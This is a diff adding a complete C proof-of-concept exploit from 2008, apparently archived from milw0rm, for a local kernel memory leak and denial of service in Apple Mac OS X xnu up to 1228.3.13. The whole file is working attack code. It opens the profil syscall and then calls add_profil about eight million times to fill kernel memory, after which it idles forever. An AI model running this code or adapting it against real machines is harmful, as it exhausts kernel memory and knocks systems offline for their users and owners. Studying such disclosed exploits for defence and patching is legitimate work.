@@ -1,0 +1,66 @@
+/* xnu-profil-leak.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS POC
+ * by mu-b - Sat 16 Feb 2008
+ *
+ * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
+ *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <fcntl.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
+/* profil defines */
+#define PROFIL_LEAK_NUM   65536 * 128
+
+int
+main (int argc, char **argv)
+{
+  char buf[1024];
+  int i, n;
+
+  printf ("Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  printf ("* opening profil, pid: %d...", getpid ());
+  if ((n = syscall (SYS_profil, &buf, sizeof buf, 0, 1)) < 0)
+    {
+      fprintf (stderr, "\n%s: syscall [SYS_profil]: failed: %d\n",
+               argv[0], n);
+      exit (EXIT_FAILURE);
+    }
+  printf ("done\n");
+
+  printf ("* filling %d-bytes of kernel memory...\n", PROFIL_LEAK_NUM * 32);
+  fflush (stdout);
+
+  for (i = 0; i < PROFIL_LEAK_NUM; i++)
+    {
+      if ((n = syscall (SYS_add_profil, &buf, sizeof buf, 0, 1)) < 0)
+        {
+          fprintf (stderr, "\n%s: syscall [SYS_add_profil]: failed: %d\n",
+                   argv[0], n);
+          exit (EXIT_FAILURE);
+        }
+      printf ("** %d-bytes filled\r",  i * 32);
+    }
+  printf ("\n* done\n");
+
+  while (1)
+    sleep (1);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2009-03-23]
